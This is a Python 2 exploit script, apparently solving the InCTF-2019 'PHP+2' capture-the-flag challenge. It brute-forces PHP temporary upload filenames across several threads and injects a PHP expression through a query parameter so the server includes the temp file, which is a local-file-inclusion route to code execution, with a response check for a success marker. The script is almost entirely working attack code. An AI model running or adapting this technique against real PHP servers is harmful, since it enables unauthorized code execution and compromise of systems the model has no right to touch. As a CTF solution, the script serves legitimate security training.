import requests
import string
import threading
import sys

charset = string.digits + string.letters
revcharset = charset[::-1]
charset2 = string.letters + string.digits

host = "127.0.0.1"
port = 80
base_url = "http://%s:%d" % (host, port)

def bruteforce(prefix,charset):
    while 1:
        for i in charset:
            for j in charset:
                for k in charset:
                    filename = prefix + i + j + k
                    url = '%s/Challenges/InCTF-2019/PHP+2/?thisfile=/&input=$a=($thisfille.(tmp).$thisfille.(php%s));include($a);' % (base_url, filename)
                    print url
                    response = requests.get(url)
                    if 'spyd3r' in response.content:
                        print "[+] Include success!"
                        return True
			#sys.exit(0)



def main():
    for i in xrange(0,3):
        threading.Thread(target=bruteforce,args=('00'+str(i),charset,)).start()
        threading.Thread(target=bruteforce,args=('00'+str(i),revcharset,)).start()
        threading.Thread(target=bruteforce,args=('00'+str(i),charset2,)).start()


if __name__ == "__main__":
    main()
